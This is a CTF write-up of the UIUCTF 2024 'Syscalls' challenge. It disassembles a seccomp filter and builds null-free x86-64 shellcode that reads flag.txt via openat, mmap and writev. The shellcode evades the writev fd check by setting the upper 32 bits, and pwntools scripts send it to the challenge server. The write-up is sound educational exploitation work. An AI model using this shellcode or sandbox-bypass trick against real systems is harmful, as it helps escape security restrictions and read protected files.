+++
title = 'Syscalls - Messing with Shellcode and Seccomp Filters'
date = 2024-07-25T17:51:11-04:00
publishDate = 2024-07-25
tags = ['ctf', 'pwn', 'writeup']
+++

I've decided to work on my binary exploitation skills lately so I went after some pwn challenges. *Syscalls* 
from this year's [UIUCTF](https://2024.uiuc.tf/) was one of them. I learned a ton from it and figured it might be worth sharing.

<!--more-->

## TL;DR

In the *Syscalls* challenge the task is simple: Write some shellcode that reads and outputs `flag.txt`. However, a custom Seccomp filter is in place that poses some restrictions on the shellcode such as forbidden syscalls. By avoiding these and adapting the shellcode to bypass the filter the flag can be obtained.

## The Challenge

Two files are provided:

- Dockerfile
- syscalls

The Dockefile doesn't seem very interesting. It basically provides some insights on how the challenge is deployed. What about the `syscalls` binary?

```bash
$ ./syscalls          
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
ehlo
zsh: illegal hardware instruction  ./syscalls
```

When executed the program outputs some information and waits for user input. The string *ehlo* as a user input for example yields an error. 

```bash
$ checksec --file=syscalls         
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX unknown - GNU_STACK missing
PIE:      PIE enabled
Stack:    Executable
RWX:      Has RWX segments
```

Checksec gives some more details on the binary. The stack is executable so the goal will presumably be to run some shellcode on the stack. The error `illegal hardware instruction` hints into that direction as well.

Let's have a look at the disassembly. Within the `main` function there are three relevant function calls. The first function (`fun1`) reads user input into a buffer that is passed via pointer. The third function (`fun3`) casts the given buffer pointer to a function pointer and executes it. So the user input is treated as shellcode that is executed.

```c
void main(void)

{
  long in_FS_OFFSET;
  char buffer [184];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  fun1(buffer);
  fun2();
  fun3(buffer);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

But what happens in `fun2`? Within that function we find some static values and two calls to `prctl`. 


```c
int fun2(void)

{
  (...)
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_d8 = 0x400000020;
  local_d0 = 0xc000003e16000015;
  local_c8 = 0x20;
  local_c0 = 0x4000000001000035;
  local_b8 = 0xffffffff13000015;
  local_b0 = 0x120015;
  local_a8 = 0x100110015;
  local_a0 = 0x200100015;
  local_98 = 0x11000f0015;
  local_90 = 0x13000e0015;
  local_88 = 0x28000d0015;
  local_80 = 0x39000c0015;
  local_78 = 0x3b000b0015;
  local_70 = 0x113000a0015;
  local_68 = 0x12700090015;
  local_60 = 0x12800080015;
  local_58 = 0x14200070015;
  local_50 = 0x1405000015;
  local_48 = 0x1400000020;
  local_40 = 0x30025;
  local_38 = 0x3000015;
  local_30 = 0x1000000020;
  local_28 = 0x3e801000025;
  local_20 = 0x7fff000000000006;
  local_18 = 6;
  local_e0 = &local_d8;
  local_e8[0] = 0x19;
  prctl(0x26,1,0,0,0);
  iVar1 = prctl(0x16,2,local_e8);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1;
}
```

First call to `prctl` with `0x26` (= 38) as first argument and second time with `0x16` (= 22). The corresponding header file [prctl](https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h) reveals the following mappings:

```c
#define PR_SET_SECCOMP	22
(...)
#define PR_SET_NO_NEW_PRIVS	38
```

Whereas `PR_SET_NO_NEW_PRIVS` basically prevents the calling process and all its descendants from gaining additional privileges, `PR_SET_SECCOMP` is used to enable or configure the Seccomp (secure computing mode) feature. The header file [seccomp.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/seccomp.h) provides some more insights on the second argument that is utilized. 

```c
/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, <mode>) */
#define SECCOMP_MODE_DISABLED	0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT	1 /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER	2 /* uses user-supplied filter. *
```

The call looks like this `prctl(0x16,2,local_e8);` thus `SECCOMP_MODE_FILTER` is the one. According to the [manpage](https://man7.org/linux/man-pages/man2/PR_SET_SECCOMP.2const.html) in this case the third argument must be a pointer to `struct sock_fprog` representing the custom filter.

This means that those static bytes can be extracted, stored in a file (e.g. `raw.bpf`) and analyzed using [Seccomp Tools](https://github.com/david942j/seccomp-tools). 

```bash
$ seccomp-tools disasm raw.bpf 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

This output shows what the filter is doing. Certain syscalls are forbidden such as `open` or `write` and others such as `writev` are allowed under certain conditions.

Forbidden syscalls:
- `read`
- `write`
- `open`
- `pread64`
- `readv`
- `sendfile`
- `fork`
- `execve`
- `splice`
- `preadv`
- `pwritev`
- `execveat`

Allowed under special conditions:
- `writev`

So the task is to create a compliant shellcode that reads `flag.txt` and outputs it in some way.

## Game Plan

At this point it's still unclear (to me) whether `writev` can actually be used. However I can't seem to figure another way to write to `STDOUT` (there most probably is) so I'll just assume it will work for now. So that's the game plan:

- `openat` to open the `flag.txt` file
- `mmap` to map the file to memory
- `writev` to write its content to STDOUT

## The Hard Way

> Disclaimer: While this was my initial approach, it is by no means the most straightforward. A simpler pwntools solution can be found [here](#the-easy-way).

Since I do not know very much about writing assembly code by hand I will start with drafting what I want to accomplish in C first. The idea is to have a working C program and then translate it to assembly.  From there it should be trivial to obtain the shellcode, feed it to the `syscalls` binary and retrieve the flag.

So the first draft looks something like this:
```c		
int main() {
    int fd = openat(AT_FDCWD, "flag.txt", O_RDONLY);

    void *addr = mmap(NULL, 128, PROT_READ, MAP_PRIVATE, fd, 0);
    if (addr == MAP_FAILED) {
        close(fd);
        return 1;
    }

    struct iovec iov = { addr, 128 };
    ssize_t bytes_written = writev(STDOUT_FILENO, &iov, 1);
    if (bytes_written == -1) {
        munmap(addr, 128);
        close(fd);
        return 1;
    }

    munmap(addr, 128);
    close(fd);

    return 0;
}
```

The program is pretty self-explanatory. Starting off with `openat` to open a file descriptor to `flag.txt`. As the relevant [manpage](https://linux.die.net/man/2/openat) suggests `AT_FDCWD` can be utilized to specify a relative path. Next the file is mapped to memory using `mmap`. The exact size of the flag inside `flag.txt` is unknown. I'll just use `128` bytes as length assuming that's large enough to hold the flag. Finally the mapped file is written to `STDOUT` using `writev`. According to its [manpage](https://linux.die.net/man/2/writev) `writev` expects a pointer to an `iovec struct` as a second argument. So I'll make sure to wrap the previously obtained pointer to our file in memory into this struct.

```bash
$ echo ehlo > flag.txt
$ ./test    
ehlo
```

Works as expected. So now this can be translated to assembly.

```asm
global _start

section .text
_start:
    xor rdx, rdx                ; null bytes
    mov rsi, 0x7478742e67616c66 ; flag.txt
    push rdx
    push rsi
    mov rdi, -100   ; AT_FDCWD
    lea rsi, [rsp]  ; flag.txt
    xor rdx, rdx    ; O_RDONLY (0)
    mov rax, 257    ; SYS_openat
    syscall
    push rax        ; save fd

    mov rax, 9      ; SYS_mmap
    xor rdi, rdi    ; NULL
    mov rsi, 0x80   ; alloc 128
    mov rdx, 0x01   ; PROT_READ
    mov r10, 0x02   ; MAP_PRIVATE
    mov r8, [rsp]   ; fd
    mov r9, 0x00    ; 0
    syscall

    push 0x80       ; size: 128
    push rax        ; iovec struct
    mov rdi, 0x01   ; STDOUT_FILENO
    lea rsi, [rsp]  ; add iovec struct
    mov rdx, 0x01   ; vlen 
    mov rax, 20     ; SYS_writev
    syscall
```

Compile:
```bash
$ nasm -f elf64 shellcode.asm -o shellcode.o
$ ld shellcode.o -o shellcode
```

Test:
```bash
$ ./shellcode         
ehlo
zsh: segmentation fault  ./shellcode
```

Looking good! However, the crafted shellcode contains lots of null bytes. As the shellcode will be read from stdin by the `syscalls` binary using `fgets` null bytes cannot be used and must be avoided.

```bash
$ objdump -d shellcode.o  

shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 31 d2                xor    %rdx,%rdx
   3:   48 be 66 6c 61 67 2e    movabs $0x7478742e67616c66,%rsi
   a:   74 78 74 
   d:   52                      push   %rdx
   e:   56                      push   %rsi
   f:   48 c7 c7 9c ff ff ff    mov    $0xffffffffffffff9c,%rdi
  16:   48 8d 34 24             lea    (%rsp),%rsi
  1a:   48 31 d2                xor    %rdx,%rdx
  1d:   b8 01 01 00 00          mov    $0x101,%eax
  22:   0f 05                   syscall
  24:   50                      push   %rax
  25:   b8 09 00 00 00          mov    $0x9,%eax
  2a:   48 31 ff                xor    %rdi,%rdi
  2d:   be 80 00 00 00          mov    $0x80,%esi
  32:   ba 01 00 00 00          mov    $0x1,%edx
  37:   41 ba 02 00 00 00       mov    $0x2,%r10d
  3d:   4c 8b 04 24             mov    (%rsp),%r8
  41:   41 b9 00 00 00 00       mov    $0x0,%r9d
  47:   0f 05                   syscall
  49:   68 80 00 00 00          push   $0x80
  4e:   50                      push   %rax
  4f:   bf 01 00 00 00          mov    $0x1,%edi
  54:   48 8d 34 24             lea    (%rsp),%rsi
  58:   ba 01 00 00 00          mov    $0x1,%edx
  5d:   b8 14 00 00 00          mov    $0x14,%eax
  62:   0f 05                   syscall
```

Luckily there are great resources out there such as the post [Null Terminated Programming 101](https://0x00sec.org/t/null-terminated-programming-101-x64/20398) by x24whoami24 that explain how to deal with that. 

For example, with null bytes:
```asm
push 0x80 ; size: 128
```

Without null bytes:
```asm
xor r10, r10  ; size: 128
add r10, 0x1
shl r10, 0x7
push r10
```

After getting rid off the null bytes let's quickly verify if everything still works:
```
$ ./shellcode         
ehlo
zsh: segmentation fault  ./shellcode
```

Promising. But something still seems off:

```bash
$ ./syscalls < payload
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
zsh: invalid system call  ./syscalls < payload
```

Let's do some debugging:

```bash
$ gdb syscalls
catch syscall prctl
run < payload
```

Since the binary is stripped `catch syscall` can be used to break near the relevant part in the program flow. In this case the syscall `prctl` seems like a good option. There should be the two calls as seen in the disassembly which are very close to the actual execution of our shellcode. After the second call we can step through until `call *%rax` which triggers the shellcode.

Now here things get sketchy. Before reaching the syscall `writev` on the `push %rax` instruction gdb displays a warning. 

![GDB](/syscalls/before_segfault.png)

One step further the program crashes:

```
Program terminated with signal SIGSYS, Bad system call.
```

At this point it is not very evident to me (maybe it should be?) that the `writev` syscall is the problem since the program crashes before the actual call to it. (I spent quite some time here, couldn't pinpoint the issue however.) 

Going forward let's just assume that `writev` is indeed the issue and reconsider the seccomp filter:

```bash
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

In line 18 `fd` argument is shifted by 32 to the right. If the remaining value is greater than 0x0 the syscall will be allowed. So the shellcode has to be adapted accordingly:

```asm
xor rdi, rdi  ; STDOUT_FILENO
add rdi, 0x1
shl rdi, 0x20 ; bypass seccomp restrictions
add rdi, 0x1
```

Now the complete assembly including null byte avoidance and bypass for the `writev` filter looks like this:

```asm
global _start

section .text
_start:
    ; syscall openat
    xor rdx, rdx                ; null bytes to terminate string
    mov rsi, 0x7478742e67616c66 ; flag.txt
    push rdx                    ; store null bytes on stack
    push rsi                    ; store flag.txt on stack
    mov rdi, 0xffffffffffffff9c ; AT_FDCWD (-100)
    lea rsi, [rsp]              ; flag.txt
    xor rdx, rdx                ; O_RDONLY (0)
    xor rax, rax                ; SYS_openat
    add rax, 0x1
    shl rax, 0x8
    add rax, 0x1
    syscall
    mov r8, rax                 ; store resulting fd in r8 
                                ; r8 will be arg5 in mmap
    
    ; syscall mmap
    xor rax, rax ; SYS_mmap (avoiding null bytes)
    add rax, 0x1
    shl rax, 0x3
    add rax, 0x1
    xor rdi, rdi ; null
    xor rsi, rsi ; length 0x80
    add rsi, 0x1
    shl rsi, 0x7
    xor rdx, rdx ; PROT_READ
    add rdx, 0x1
    xor r10, r10 ; MAP_PRIVATE
    add r10, 0x2
    xor r9, r9   ; flags
    syscall

    ; syscall writev
    xor r10, r10  ; size: 128
    add r10, 0x1
    shl r10, 0x7
    push r10
    push rax      ; iovec struct
    xor rdi, rdi  ; STDOUT_FILENO
    add rdi, 0x1
    shl rdi, 0x20 ; bypass seccomp restrictions
    add rdi, 0x1
    lea rsi, [rsp] ; add iovec struct
    xor rdx, rdx   ; vlen
    add rdx, 0x1
    xor rax, rax   ; SYS_writev
    add rax, 0x14
    syscall

    ; return properly
    xor rax, rax
    leave
    ret
```

I also added proper return instructions so the program does not segfault anymore. Testing this against the local instance:

```bash
$ ./syscalls < payload 
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
ehlo
```

Cool!

The crafted payload can now be sent to the CTF's remote instance using some pwntools scripting.

```python
from pwn import *

payload = open("payload", "rb").read()

r = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)
r.recv()
r.sendline(payload)
flag = r.recv()
print(flag)
```

```bash
$ python exploit.py
[+] Opening connection to syscalls.chal.uiuc.tf on port 1337: Done
b'uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Yay! 🎉
## The Easy Way

For some reason I only stumbled upon 0xdf's very helpful [youtube video](https://www.youtube.com/watch?v=GQnxTXB0bXY) covering this exact topic after completing the challenge. As it turns out, I was making things way harder than they really are. The same result can be achieved using [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) with a couple of lines of python code. 

```python
from pwn import *

context.log_level = 'debug'
context.update(arch="amd64")

LEN = 128

AT_FDCWD = -100
PROT_READ = 1
MAP_PRIVATE = 2
STDOUT_FILENO = 1

# open fd
payload = shellcraft.linux.openat(AT_FDCWD, "flag.txt", 0)
# allocate memory
payload += shellcraft.linux.mmap(0, LEN, PROT_READ, MAP_PRIVATE, "rax", 0)

# push iovec to stack
payload += shellcraft.push(LEN)
payload += shellcraft.push("rax")

# filter bypass
fd = STDOUT_FILENO << 32
fd += STDOUT_FILENO
# write to STDOUT
payload += shellcraft.linux.writev(fd, "rsp", 1)

# return properly
payload += shellcraft.ret(0)

p = process("./syscalls")
p.readline()
p.sendline(asm(payload))
p.readline()
```

So [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) provides python bindings for each syscall. The only challenge is finding the correct
arguments and also adding the filter bypass for `writev`. This way we can focus on solving the challenge on a logical level rather than having to fiddle with
assembly by hand.

```bash
$ python pwn-exploit.py
[+] Starting local process './syscalls': pid 25811
b'ehlo\n'
[*] Stopped process './syscalls' (pid 25811)
```

Although this solution is much simpler, going the extra mile has still proven to be a great learning experience. :)

## Resources

- ASM avoiding nullbytes - https://0x00sec.org/t/null-terminated-programming-101-x64/20398
- pwntools - https://python3-pwntools.readthedocs.io/en/latest/index.html
- Searchable Linux Syscall Table - https://filippo.io/linux-syscall-table/
- Seccomp Filters and Shellcode - https://www.youtube.com/watch?v=GQnxTXB0bXY
- Seccomp-Tools - https://github.com/david942j/seccomp-tools
